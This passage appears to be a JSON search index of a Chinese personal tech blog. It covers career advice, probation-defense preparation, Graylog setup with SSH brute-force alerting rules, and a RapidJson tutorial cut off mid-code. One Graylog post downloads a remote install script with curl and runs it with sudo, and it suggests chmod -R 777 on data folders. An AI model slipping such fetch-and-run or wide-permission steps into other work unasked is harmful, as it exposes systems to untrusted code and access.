对我来说，这个终式不算是什么经验，而应该算是我所悟到的优秀的特性负责人必须有的品质。我至今不能二话不说就打别人的电话，而总是寄望于对方看到我的留言后帮我解决问题。实际上，办事时脸皮一厚，就会让效率提高百倍。关注的重点不能放在对方是否被我们打扰，而应该放在我们是否需要对方快速响应这个问题好让工作继续推进下去。\n在我的认知里，这个终式简直是本文所有其他经验的基石，无论是最开始找周边的一帮素不相识的人商定计划，还是遇事不决就找领导们进行求助，都非脸皮厚如城墙不可。诚然有人认为这种东西实在稀松平常，就是日常工作所必须的部分，并没有我所说的这样夸张，但我必须指出，不同个体之性格天然迥异，正是也有一些较木讷内向的人阴错阳差地成为FO，且因为较木讷内向的性格导致了所谓“日常的”工作正在艰难地推进，我的这一小节的经验，就专为这些人而写，其中自然也包括我自己。\n","date":"2023-03-26T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E7%89%B9%E6%80%A7%E8%B4%9F%E8%B4%A3%E4%BA%BAfo%E4%B8%8A%E6%89%8B%E7%BB%8F%E9%AA%8C/","title":"特性负责人（FO）上手经验"},{"content":"转正答辩复盘 2022年11月18日，完成了人生中第一个转正答辩，结果未知。\n答辩10天前收到时间安排，开始着手准备，一开始无比迷茫，完全不知道从何做起，无比难受，故有此篇，稍作记录，且供后来者参考。\n随便聊聊 首先想谈谈我对试用期、转正答辩以及所需要准备的一些东西的看法。嫌啰嗦的读者可直接跳转 1 PPT的准备 。\n试用期是《劳动法》规定的用人单位与劳动者约定的一段时间，在这段时间内，用人单位对新招收的职工进行思想品德、劳动态度、实际工作能力、身体情况等进行进一步考察 [1] 。\n不同单位有不同的方式来表征试用期结束。据我所知，有的单位要求写试用期总结报告、有的单位要求进行转正答辩，我的看法是，单位对员工在试用期间的工作表现进行了解和评价，很正常，既然双方都认可试用期的存在，就必须同时接受这么些流程；不可接受的是，利用法律bug在试用期间解除劳动合同，以此逃避经济补偿，简单说就是所谓“卡试用期”。有的单位把试用期流程一点不差的走完，最后以所谓“试用期间输出太少”、“转正答辩不通过”等为由裁员，这是非常恶心的，这也是部分人很讨厌转正答辩甚至试用期的原因。\n对我来说，试用期和转正后不应该出现太大区别，甚至试用期间更没底气，因为单位在这段时间内可以解除劳动合同而不予经济补偿，所以我是以积极的态度来对待试用期间的工作，以及转正答辩的。\n转正答辩所需要的所有材料，基本就是一份PPT，以及可能需要在系统上提交一份试用期总结。PPT是有说法的，我一直觉得写PPT跟写文章一样，一得有结构，二得有详略，因此在准备答辩PPT的时候犯了很大的难，主要还是不知道这么一篇“文章”要怎么写。最后是到网上七看八看，结合以前写答辩PPT的经验，也算是把这个材料写出来了，这篇记录也是希望给同我一样在转正答辩之前感到无从下手的朋友们一点启发。\n1 PPT的准备 1.1 结构 首先无论试用期干了多少事情，这PPT都必须是有结构的，没有结构的PPT必然伴随没有结构的答辩，这样一来，别人就很难在你讲解的十几分钟内理解你想表达的东西。\n晒一波我自己的答辩PPT结构，大佬们轻喷。\n我的答辩PPT结构 自我介绍部分，花一至二页的篇幅，让评委们知道你是从哪儿毕业的，啥时候入职的，在什么团队里负责什么事情等等……之前看过一些经验贴（找不到了，不做reference了 😆），会在自我介绍部分贴上自己的实习经历啥的，我认为 完全没必要 ，因为这不是转正答辩的重点，且会占用一定的篇幅和时长，除非这段实习经历确实很酷炫，否则不要加。此外，我认为 在什么团队负责什么事情 是一定要写的，因为这可以算是这篇“文章”的总起句，我们的核心——工作总结——是围绕这个展开的。\n工作总结部分，主要就是讲讲试用期间做了哪些事情。我认为这部分可以是一个小总—分结构，先对整体的时间分配、整体的工作输出情况做个总结，然后分开讲不同的事情。在陈述某一件具体的工作的时候，不需要总分，只要把背景——实施——结果——收获讲清楚就行，或者也可以参考STAR法则 [2] ，即背景 Situation 、任务 Task 、行动 Action 和结果 Result 来陈述这件事。我自己的想法是，没必要把具体做的事情展开的非常详细，重点还是围绕 难点和如何克服难点 来展开。此前还看过一些经验贴，认为需要把自己对这件事情的思考体现出来，我觉得这个可以放在收获部分来写，浅提一笔没有问题，展开太多则会显得言之无物。\n不足与展望，很常规，很多答辩都是有这个部分的，主要简单讲讲试用期间发现的自己的不足，以及下阶段的工作计划。讲不足的时候要提一嘴之后打算怎么改正，发现问题谁都会，更重要的是解决问题的方案；讲计划的时候可以分为短期、中期和长期计划，我自己只写了短期和中期计划，毕竟长期计划写了也没啥用，而且尺度不好拿捏。\n致谢部分，没啥可说的。我对待这个部分其实蛮认真的，想了很久的致谢语，因为确实是有那么些人在这段时间内帮了我很多。\n1.2 详略 PPT除了有结构，还要有详略。正如一切好文章那样，没必要说的东西就别说，有价值的东西就展开说清楚。\n略 。自我介绍、不足和展望、工作的思考等等，这些东西都是比较虚的东西，没必要写太多。尤其是自我介绍，我答辩做自我介绍的时候评委连PPT都不看一眼……对工作的思考，这个我和其他一些经验贴的看法不太一致，有的博主觉得对工作的思考很重要，不过我觉得对朴实无华的技术岗来说， talk is cheap ，大家对自己的工作都有很多想法，挑自己觉得最深刻的一两点来说就行了。\n详 。工作中遇到的难点、如何克服难点，这些能体现出你做的事情的意义和你的能力。我第一版PPT的问题就是没把难点和克服难点展开说，后面被主管大大认为有点言之无物，然后改了一版，补充了很多细节，才显得确实是有投入时间到这些事情当中的。\n除了要点的详略，还有取材的详略。不重要的工作甚至可以直接一笔带过，连展开都不展开，毕竟答辩是有时间限制的。\n最后应当指出，所谓的“详”并不是在PPT上写小作文，而是呈现细节、突出要点。PPT的页面一定是 简洁 的，大段大段的表达应该放在你的讲说中，而不是写在PPT上。\n2 讲说 PPT只是讲说的辅助工具，一份结构合理、详略得当的PPT也要搭配精心编排过的讲说才能发挥出它的最大效用。\n有些同学会觉得PPT是自己写的，那么讲说的重点早在写PPT时就已经构思过了，而忽略了针对讲说进行专门的练习，最后在领导面前变成了无情的读PPT机器。\n我觉得讲说有几个要点：\n流畅。绝对不能临场忘词，不然就显得你对这份PPT完全不熟悉，甚至于对你做过的工作完全不熟悉，这就太捞了。\n有内容。无情的读PPT机器不可取，一定要围绕PPT进行展开，使评委得到PPT上得不到的信息，这样才能有好的效果。\n时长合理。时长的要求，看似很好做到，其实很难。如果是即兴发挥的讲说，很容易对某一些点展开过多，搞得超时；或者如果在台上很紧张，忘词，很容易变成读PPT的机器，搞得时长过短。\n我在准备答辩的时候，在家里自己做了6、7次的讲说练习，一边在手机上放映PPT，一边模拟讲解。第一次讲说练习的时候，花了30分钟才磕磕绊绊地把我自己做的PPT讲完，足以说明写PPT和讲PPT有多么巨大的不同。\n有条件的同学可以在讲说的时候录音，讲说完成之后复盘（我就是这样做的），这样假如自己在练习中即兴吐玉了，也可以及时抓住，固定到自己的表达当中；或者假如自己在某一部分说得太多了，可以在下一次讲说中有意地删减不必要的表达。\n讲说的详略并不完全和PPT的详略相对应，要在多次练习中调整，以实现合理的时间分配。\n3 预答辩 在答辩前几天，主管会组织我们进行预答辩，先把这个PPT讲给主管、师傅和其他同事听。他们通常会提出很多建设性的意见，这时候遵照他们的建议好好修改PPT即可。我有信心的是，只要满足前文所说的PPT和讲说标准，就不会在预答辩中大翻车，基本只需要遵照原有的体系进行一些小修补即可。\n4 答辩 我在答辩前一周心里很慌，在答辩前一小时反而在认真干活，这真是一件神奇的事……\n到答辩当天，基本已经自己练习过多次，也预答辩多次了，答辩前半小时再把自己的PPT放映一遍，回忆一下自己要讲述的重点，到点之后自信地开始答辩即可😏。\n参考资料 [1] 《中华人民共和国劳动法：实用版》.北京:中国法制出版社,2018.10（2022.9重印）\n[2] \u0026ldquo;STAR法则_百度百科,\u0026rdquo; Baike, https://baike.baidu.com/item/STAR%E6%B3%95%E5%88%99/9056070\n","date":"2022-11-20T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%BD%AC%E6%AD%A3%E7%AD%94%E8%BE%A9%E7%BB%8F%E9%AA%8C/","title":"转正答辩经验"},{"content":"在 前一篇使用小记 中，我记录了如何利用Docker安装运行 Graylog 、如何设置配置文件、如何使用Graylog的输入流、提取器、事件和告警，并在最后记录了我个人对提取器、筛选和事件的理解。\n我对这个产品还有一些地方比较好奇：\n第一个问题是我在上一篇的分析当中遗留的： ⌈ 不过还是有个小bug，事件聚合的时候只能考虑具有 相同源IP 的登录失败日志，不过这一点可能是Graylog的进阶用法，今天还没探索到这个地步 ⌋\n第二个问题，如何把事件串联起来。例如在对 暴力破解成功 进行告警时，我们首先要产生一个 暴力破解 的事件，这个事件当中可能包含比如说 10 条的登录失败日志，紧接着要产生一个 登录成功 事件，这个事件只需要由一条登录成功日志来触发；这两个事件先后发生时，就代表了 暴力破解成功 的情况。\n0 预设环境 今天，我打算以真正的Linux上的SSH日志为例，来研究一下Graylog要如何处理以上两个问题。\n日志样例：\nJul 12 06:09:43 combo sshd(pam_unix)[4048]: authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost=68.143.156.89.nw.nuvox.net user=root Jun 30 22:16:32 combo sshd(pam_unix)[19434]: session opened for user test by (uid=509) 对应配置了一系列提取器：\nextractors 其中只有 SSH_PAM_SESSION_OPEN 是用于匹配登录成功的日志，其余提取器均用于登录失败日志。\n这里有一个我比较不满意的点，就是配置正则提取器的时候只能提取出 第一个 匹配组（match group）；当我希望从登录失败日志当中提取较多信息的时候，就要配置很多个提取器（比如上图当中配置了提取远程主机、用户名、时间、进程ID等信息的提取器），这些提取器用的其实都是同一个正则，完全没必要进行这么多冗余配置。\n上图中有两个提取器值得展开说明，它们是 SSH_PAM_AUTH_FAILURE 和 SSH_PAM_SESSION_OPEN ：\nSSH_PAM_AUTH_FAILURE SSH_PAM_SESSION_OPEN 可以看到，这两条正则其实就是把整个消息体都匹配出来，放到了对应的自定义字段里。这样做的意义是便于使用我们在 前一篇使用小记 当中提到的筛选方式 _exists_: [xxx] 来筛选出所有满足正则的消息，相当于绕了个弯来实现 正则筛选 ，这么做的原因是按照官方Demo来写正则筛选语句根本筛不到对应的日志，我觉得没必要浪费时间来研究这种不属于我的问题。\n1 聚合 在前一篇使用小记当中，我提到对于SSH暴力破解攻击来说，只有登录失败日志都来自于 同一IP 才有意义，否则可能由于多用户并发登录失败引发系统误报。此外，也不能每一条登陆失败日志就触发一次事件告警，而应该等到登录失败日志出现了比如说 10 次以后，再产生一条告警。\n这样的功能可以通过 事件聚合 来实现。在定义事件的【Filter \u0026amp; Aggregation】一栏当中，可以配置聚合设置，例如对于登录失败日志，我们以 REMOTE_HOST 即SSH登录的源主机名来作为分类，并为源主机名配置一个阈值 10 ，这样，仅当来自 某个 主机的SSH登录失败次数达到 10 以上时，才会产生一条事件。\nAggregation 此外，在【Fields】一栏中添加 REMOTE_HOST 字段，并把这个字段设置为 key 。\nFields 一切就绪之后，把日志打到输入流中 cat linux_log.log | nc 127.0.0.1 1514 ：\nevents 2 关联 其实事件关联是我最期待实践的功能，however：\ncorrelations 寄！\n其实我研究Graylog的初衷就是为了提高工作当中问题定位的效率，事件关联是一项非常有用的功能，它能够帮助我们定义出符合业务逻辑的事件链条，令我们更好地从日志当中提取出有效信息。不过，既然是高级功能，玩不到的话也就罢了，至此所体验的这些，大概也比手动搜索keyword要强上许多，还是期待它投入实战的那天罢。\n","date":"2022-10-02T00:00:00Z","permalink":"https://xrg.fj.cn/p/graylog%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B02/","title":"Graylog使用小记——2"},{"content":"背景 最近在工作中发现我们基本采取一种DevOps的工作方式，开发即运维，有时一个问题要定位很久，维测能力非常差。\n造成维护困难的原因有很多，我认为有几点比较重要：\n代码稳定性差。这个问题对于一个发展初期的业务来说比较常见，只能说尽力避免。\n日志太多。开发人员写代码的时候总是毫不吝惜日志打印操作，这些信息对于某一个功能来说可能很全面，但在一个完整的模块里面，这会带来超级多的噪声。\n原始的分析方式。\n因此我希望找一个能够方便地分析庞杂的日志数据的工具，试图减轻运维的压力。经过简单的选型，决定试一试 Graylog ，本文小作记录。\nStep 0 环境配置 预装：WSL2 + Ubuntu22.04 + Windows Terminal\ndocker on WSL2 下载 Docker Desktop for Winodws ，傻瓜式安装。\n首先设置启用WSL支持：\n接着进入 阿里云镜像加速 搞一个加速器，然后在Docker Desktop【Docker Engine】一栏里面配置加速器地址：\naliyun加速 点击右下角 Apply \u0026amp; Resatrt 即可。\n另一种在WSL2上安装docker的方法：\n按照 参考资料[2] 所说的，我们也可以在WSL上直接执行以下命令：\n$ curl -fsSL https://get.docker.com -o get-docker.sh $ sudo sh get-docker.sh $ sudo service docker start 这里我并未实践，仅供读者参考。不过，作者的提醒很有参考价值：\n注意：不同于完全linux虚拟机方式，WLS2下通过apt install docker-ce命令安装的docker无法启动，因为WSL2方式的ubuntu里面没有systemd。上述官方get-docker.sh安装的docker，dockerd进程是用ubuntu传统的init方式而非systemd启动的。\n这个坑我是踩过的，在WSL2上按照Linux方式安装docker会失败，服务起不来的。\ndocker compose Graylog运行需要三个镜像：\nGraylog: graylog/graylog\nMongoDB: mongo\nElasticsearch: Elasticsearch\n这意味着我们需要拉取三个镜像，分别启动对应的容器，其间还涉及路径映射、端口映射等操作，烦死人。\n还好我们有 docker compose ，它是一个用于定义和运行多个容器的工具，我们可以通过 yaml 来配置容器服务，使用一条命令拉起所有容器。\n具体技术细节在这里就不多讨论，我主要记录如何配置一个有效的Graylog的 docker-compose.yaml 。\nversion: \u0026#39;2\u0026#39; services: # MongoDB: https://hub.docker.com/_/mongo/ mongodb: image: mongo:4.2 volumes: - /home/albusguo/graylog/volumes/mongo_data:/data/db # Elasticsearch: https://www.elastic.co/guide/en/elasticsearch/reference/7.10/docker.html elasticsearch: image: docker.elastic.co/elasticsearch/elasticsearch-oss:7.10.2 volumes: - /home/albusguo/graylog/volumes/es_data:/usr/share/elasticsearch/data environment: - http.host=0.0.0.0 - transport.host=localhost - network.host=0.0.0.0 - \u0026#34;ES_JAVA_OPTS=-Xms512m -Xmx512m\u0026#34; ulimits: memlock: soft: -1 hard: -1 mem_limit: 1g # Graylog: https://hub.docker.com/r/graylog/graylog/ graylog: image: graylog/graylog:4.3 volumes: - /home/albusguo/graylog/volumes/graylog_data:/usr/share/graylog/data entrypoint: /usr/bin/tini -- wait-for-it elasticsearch:9200 -- /docker-entrypoint.sh links: - mongodb:mongo - elasticsearch restart: always depends_on: - mongodb - elasticsearch ports: # Graylog web interface and REST API - 9000:9000 # Syslog TCP - 1514:1514 # Syslog UDP - 1514:1514/udp # GELF TCP - 12201:12201 # GELF UDP - 12201:12201/udp 这个文件的内容和 官方文档 提供的Demo不太一样，我主要做了几点修改：\n直接把路径映射写死在文件里面，比如 /home/albusguo/graylog/volumes/graylog_data:/usr/share/graylog/data 表示我主机上的 /home/albusguo/graylog/volumes/graylog_data 和Graylog容器内的 /usr/share/graylog/data 同步；\n删除了Graylog容器的环境变量。例如官方Demo里面配置了 GRAYLOG_PASSWORD_SECRET 用于设置登录密码等，我们要采用配置文件的方式，因此这里没必要再写。\nStep 1 运行 有了 docker-compose.yaml 之后，还需要做一些工作才可以成功把容器运行起来。\nGraylog配置 在写 docker-compose.yaml 的时候提到，我在文件中删除了Graylog容器的环境变量，因为我们要通过配置文件的方式来传递这些参数。\nGraylog的配置文件存储在 容器内 的 /usr/share/graylog/data/config/ 路径下，而这个路径的父路径 /usr/share/graylog/data 跟我们宿主上的 /home/albusguo/graylog/volumes/graylog_data 关联在一起，因此我们要预先在宿主上设置好配置文件，否则Graylog无法获取到正确的参数。\n官方推荐的配置文件下载办法是：\nmkdir -p ./graylog/config cd ./graylog/config wget https://raw.githubusercontent.com/Graylog2/graylog-docker/4.3/config/graylog.conf wget https://raw.githubusercontent.com/Graylog2/graylog-docker/4.3/config/log4j2.xml 可以直接科学上网拿到这两份文件的内容，写到正确的位置上即可。\nroot@AlbusGuo-PC:/home/albusguo/graylog# ll /home/albusguo/graylog/volumes/graylog_data/config/ total 52 drwxrwxrwx 2 1100 1100 4096 Sep 25 12:14 ./ drwxrwxrwx 8 root root 4096 Sep 25 12:14 ../ -rw-rw-rw- 1 root root 35822 Sep 25 12:24 graylog.conf -rw-rw-rw- 1 root root 1629 Sep 25 12:13 log4j2.xml -rw-rw-rw- 1 1100 1100 36 Sep 25 12:14 node-id 口令设置 Graylog需要为 admin 账户设置登录口令，这要求我们在配置文件里写上口令明文和口令的 SHA256 值。\n使用 pwgen 生成口令，位数一定要多一点，有些教程在这一步简单生成了十几位口令，而我使用的Graylog要求 64 位以上，在这里会翻车。\npwgen -N 1 -s 96 # 记录这个输出，记作 pwd echo -n\u0026#34;Enter Password: \u0026#34; \u0026amp;\u0026amp; head -1 \u0026lt;/dev/stdin | tr -d \u0026#39;\\n\u0026#39; | sha256sum | cut -d\u0026#34; \u0026#34; -f1 # 输入刚才得到的 pwd，得到它的SHA256值 我们得到的这两个值，分别填到 graylog.conf 文件当中的 password_secret 字段和 root_password_sha2 字段，这样才可以使用 admin 登录Web服务。\n路径权限 由于我们做了路径映射，就要使得容器有对应宿主路径的写权限。例如把主机上的 /home/albusguo/graylog/volumes/es_data 映射到 elastic-search 容器内的 /usr/share/elasticsearch/data 路径，那么这个容器就要有写 /home/albusguo/graylog/volumes/es_data 的权限，否则会因容器内部做的修改无法同步到主机上而产生错误。\n一个比较简单的方法是 chmod -R 777 /home/albusguo/graylog/volumes/ ，开这个路径下的全部权限，也可以使用 a+w 的选项，总之这是一个需要注意的点。\n运行 万事俱备，启动运行！\ndocker-compose up # ........... # graylog_1 | 2022-09-25 07:29:06,729 INFO : org.graylog2.bootstrap.ServerBootstrap - Graylog server up and running. Step 2 配置输入流 配置 成功启动容器之后，可以通过 localhost:9000 访问到Graylog的web界面。\n账号是 admin ，密码是 此前 生成并写入配置文件的明文。\n进入Web界面，直接开始配置输入流。【System】——【Inputs】，选择一个输入流，如TCP文本数据：\ninputs 点击【Launch new input】启动该输入流，来到配置界面，我们主要关注两点：\nconfig 一定要注意这里的端口号，由于我们的Graylog运行在docker内，外界数据要通过主机端口转发到容器端口，这里的端口要选择此前配置过端口映射的端口。\n还记得我们的 docker-compose.yaml 吗？在这个文件内为graylog容器配置了端口映射：\n===== snip ===== ports: # Graylog web interface and REST API - 9000:9000 # Syslog TCP - 1514:1514 # Syslog UDP - 1514:1514/udp # GELF TCP - 12201:12201 # GELF UDP - 12201:12201/udp 必须选择这里有的端口，否则我们的数据无法到达容器。\n以TCP端口 1514 为例，只要在input配置界面写上这个端口，滑到底端保存，就完成了一个输入流的配置：\nport config 检查 我们来检查一下这个输入流是否生效。\n随便找一些数据，这里我以自己的一个小站点的日志为例：\ncat log_example.log ... 20220924 13:06:36.291066 UTC 3863 DEBUG [handleError] [10.206.0.6:443--8.142.110.170:38452] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 13:06:41.610243 UTC 3863 DEBUG [handleError] [10.206.0.6:443--8.142.110.170:46002] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 13:06:43.722297 UTC 3863 DEBUG [handleError] [10.206.0.6:443--8.142.110.170:51386] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 13:06:46.300990 UTC 3863 DEBUG [handleError] [10.206.0.6:443--8.142.110.170:55796] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 14:55:20.584554 UTC 3863 DEBUG [handleError] [10.206.0.6:80--8.142.110.170:34386] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 14:59:44.488731 UTC 3863 DEBUG [handleError] [10.206.0.6:443--82.157.59.178:15274] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 20220924 15:00:31.891461 UTC 3864 ERROR error - MysqlConnection.cc:536 20220924 15:00:31.891501 UTC 3864 ERROR Error(2006) [HY000] \u0026#34;MySQL server has gone away\u0026#34; - MysqlConnection.cc:498 20220924 15:00:31.891508 UTC 3864 ERROR sql:select * from excerpts - MysqlConnection.cc:500 20220924 15:27:40.884592 UTC 3863 DEBUG [handleError] [10.206.0.6:443--167.248.133.119:34466] - SO_ERROR = 104 Connection reset by peer - TcpConnectionImpl.cc:930 我们使用 netcat 来把这些数据发送到graylog的端口上， 注意刚才配置的输入流端口是容器端口，而数据发送的端口是主机端口 ，如果你在端口映射阶段把两者的端口设置为不同，在这里就要花点时间理清它们的关系。\ncat log_example.log | nc 127.0.0.1 1514 来到graylog的【Search】界面，看到刚才发送的日志数据，即说明输入流工作正常。\nSearch Step 3 配置提取器 extractor 提取器是从输入流当中提取字段的工具，这常见于需要对日志数据进行分析的场景，如网络连接日志，我们需要从日志当中提取访客IP。\n不过这里还是以刚才的日志为例，注意到日志当中有一些日志形如：\n20220924 15:00:31.891508 UTC 3864 ERROR sql:select * from excerpts - MysqlConnection.cc:500 似乎是执行SQL语句的记录，那么，我们的焦点就是被执行的SQL语句是什么，接下来配置提取器来把它从日志当中提取出来。\n还是在配置输入流的界面，选择配置提取器：\nextractors 添加提取器，选中一条示例数据（Message ID可以从【Search】界面获取）：\nadd extractor 在示例数据上选择提取类型，最常见的是正则：\nreg extractor 撰写适合于此类数据的正则，要提取的 目标字段用小括号括起来 ，并且要注意正则的普适性：\nreg 如果没有问题，就可以为提取出的字段命名，保存即可。\n重新打入数据，再来到【Search】界面，点开一条日志，可以看到已经提取出了 SQL_COMMAND 字段（字段名是自己写的）：\ne.g. 而其他的日志内容不符合我们刚才写的正则，那么它就不存在这个字段：\ne.g. 这个字段的有无，也可以作为我们对日志进行筛选的一个规则：\nsearch 更多的筛选写法可以参考 官方文档 。\nStep 4 事件和告警 除了筛选之外，Graylog还支持事件和告警的配置。\n【Alerts】——【Event Definitions】，新增事件：\nevent 事件的核心是过滤器，我们要从日志中过滤出我们关注的事件，可以使用刚才使用过的 筛选语法 ：\nfilter 还可以从日志当中提取关键字段，以便我们对事件进行分析：\nfields 事件发生时，Graylog执行提醒动作，例如向指定邮箱发送邮件，在这里就不配置了。\n整个事件的配置如下：\nevent summary 至此，可以从一大堆日志当中分析出我们想要的事件，并且事件当中包含了我们配置的额外字段：\nevents Final 分析\u0026amp;小结 分析 简单使用过Graylog之后，我想对它的功能和意义做一点分析。\n首先，乍一看很容易把提取器、筛选、事件混为一谈，尤其是三者都支持正则；但是，它们的定位是明确的：\n提取器：从原始消息里面提取出可用字段，如果我们需要使用日志当中的某些内容，那么一定需要提取器；甚至，提取器得到的字段可以被筛选语句和事件所使用，因此它可以看成是日志分析的一个基础。\n筛选：筛选和事件基本是一样的，但筛选的能力比较弱，我们可以从一大堆日志里面筛选出我们需要的日志，但筛选的结果并不能说明什么内容，甚至于我们拿个文本编辑器来筛都可以得到差不多的效果。\n事件：事件是日志处理的结果，它不仅支持筛选，还支持聚合。我们在分析问题的时候通常关注事件而不是日志，我们要知道发生了什么，而不是所有的细节。\n以一个场景来引发读者与我一起进行综合性思考：如何使用Graylog对常见的 暴力破解 进行告警？\n自上往下看，我们关注的是 暴力破解 事件，因此这个事件是必然要定义的。事件的筛选比较简单，可以直接使用正则来匹配 登录失败 的日志，但并不是每条登录失败日志都应该触发这个事件，因此要设置聚合，比如匹配 20 条失败日志就触发暴力破解事件。\n事件触发之后，我们最关心的问题应该是攻击者是谁，这个信息必须要从日志当中提取。因此，我们要对 登录失败 日志再配置一个提取器，来把日志当中的源IP提取出来。\n至此，我们就把提取器、筛选和事件综合起来了。\n不过还是有个小bug，事件聚合的时候只能考虑具有 相同源IP 的登录失败日志，不过这一点可能是Graylog的进阶用法，今天还没探索到这个地步。\n小结 月末周日是非常短暂的，简单玩了玩Graylog，写了篇记录，就结束了短暂而愉快的一天。本文从docker安装开始，介绍了Graylog的配置、运行、输入流、提取器和事件，初心是把这些东西运用到我的工作中，提升问题定位的效率。目前来看，具备一定的实用性，至少界面会比notepad++友好许多，有机会投入实战检验一下效果。\n参考资料 [1]\u0026ldquo;Get started with Docker remote containers on WSL 2,\u0026rdquo; Learn, Sep. 22, 2022. https://learn.microsoft.com/en-us/windows/wsl/tutorials/wsl-containers\n[12]\u0026ldquo;docker wsl2启动不了_win10利用WSL2安装docker的2种方式_weixin_39786155的博客-CSDN博客,\u0026rdquo; Blog, https://blog.csdn.net/weixin_39786155/article/details/110363154\n[3]\u0026ldquo;Search query language,\u0026rdquo; Docs, https://docs.graylog.org/docs/query-language\n[4]\u0026ldquo;Docker,\u0026rdquo; Docs, https://docs.graylog.org/docs/docker\n","date":"2022-09-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/graylog%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/","title":"Graylog使用小记"},{"content":"近期有个需求需要对 JSON 数据进行解析，上周五搞了一点点之后就去忙其他的事情了，正好用周末时间搞一搞，输出点东西。\nRapidJson 是一个C++的JSON解析器及生成器，特点详见官网，此处仅作使用记录。\n环境：\nWindows 11 64bit\nWSL2 Ubuntu 22.04\ncmake version 3.22.1\ngcc version 11.2.0 (Ubuntu 11.2.0-19ubuntu1)\n读者需要具备的一些前置知识：\ncmake基本使用、c++、Linux基本使用\nStep 1 安装 RapidJson 项目是一个纯头文件库，直接把仓库中的 include/rapidjson 拷贝到我们CPP项目的头文件包含路径内即可。\nStep 1.1 cmake install 对于cmake项目来说，只需要创建一个合适的地方来存放头文件：\nalbusguo@AlbusGuo-PC:/mnt/d/Scripts/CPPScripts/RapidJson$ tree . ├── CMakeLists.txt ├── build ├── include │ └── rapidjson │ ├── allocators.h │ ├── cursorstreamwrapper.h │ ├── document.h │ ├── encodedstream.h │ ├── encodings.h │ ├── error │ │ ├── en.h │ │ └── error.h │ ├── filereadstream.h │ ├── filewritestream.h │ ├── fwd.h │ ├── internal │ │ ├── biginteger.h │ │ ├── clzll.h │ │ ├── diyfp.h │ │ ├── dtoa.h │ │ ├── ieee754.h │ │ ├── itoa.h │ │ ├── meta.h │ │ ├── pow10.h │ │ ├── regex.h │ │ ├── stack.h │ │ ├── strfunc.h │ │ ├── strtod.h │ │ └── swap.h │ ├── istreamwrapper.h │ ├── memorybuffer.h │ ├── memorystream.h │ ├── msinttypes │ │ ├── inttypes.h │ │ └── stdint.h │ ├── ostreamwrapper.h │ ├── pointer.h │ ├── prettywriter.h │ ├── rapidjson.h │ ├── reader.h │ ├── schema.h │ ├── stream.h │ ├── stringbuffer.h │ ├── uri.h │ └── writer.h └── src ├── CMakeLists.txt ├── core ├── main └── main.cpp 然后在 src/CMakeLists.txt 文件里指定 INCLUDE_DIRECTORIES(../include) 即可。\nStep 1.2 VSCode install 按照上一步完成配置，则cmake可以正确地完成编译工作；但我们通常在VSCode里进行编码，也有部分读者习惯通过VSCode进行运行/调试，因此有必要对VSCode也进行配置。\n按 F1 调出指令框，输入 c/c++: Edit Configurations 打开 C/C++ 插件的JSON配置文件:\nf1 指定 includePath ：\ninclude path 这样，编码时就能完成头文件的查找和自动补全了。\n紧接着 ，我们要配置一键编译运行的查找路径。VSCode编码时使用的头文件路径和编译时使用的头文件路径并不共享，我们单击右上角的小三角来一键运行时，本质上是快捷执行了一条终端命令而已，因此要对这条命令来进行额外配置。\n在工作区根目录下找到 .vscode 文件夹，打开 tasks.json ：\ntasks.json 如果不存在这个文件夹或不存在这个文件，可以自己新建。\ntasks.json 文件当中有一键运行的配置项，我们在编译参数里面新增 -I 来指定包含路径，这里贴出我的 tasks.json ，供参考：\n{ \u0026#34;tasks\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;cppbuild\u0026#34;, \u0026#34;label\u0026#34;: \u0026#34;C/C++: g++ build active file\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;/usr/bin/g++\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-fdiagnostics-color=always\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;${file}\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;${fileDirname}/${fileBasenameNoExtension}\u0026#34;, \u0026#34;-I${workspaceFolder}/RapidJson/include\u0026#34;, \u0026#34;-I${workspaceFolder}/RapidJson/third/googletest/include\u0026#34; ], \u0026#34;options\u0026#34;: { \u0026#34;cwd\u0026#34;: \u0026#34;${fileDirname}\u0026#34; }, \u0026#34;problemMatcher\u0026#34;: [ \u0026#34;$gcc\u0026#34; ], \u0026#34;group\u0026#34;: { \u0026#34;kind\u0026#34;: \u0026#34;build\u0026#34;, \u0026#34;isDefault\u0026#34;: true }, \u0026#34;detail\u0026#34;: \u0026#34;Task generated by Debugger.\u0026#34; } ], \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34; } 完成之后，就可以一键运行/调试我们的cpp文件了。\nStep 2 使用 Step 2.1 读JSON RapidJson将一个JSON字符串解析成一个文档对象模型（Document Object Model，DOM），类似Javascript对HTML页面的操作。\nTalk is cheap ：\n#include \u0026lt;rapidjson/document.h\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace rapidjson; int main(int argc, char *atgv[]) { std::string jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; 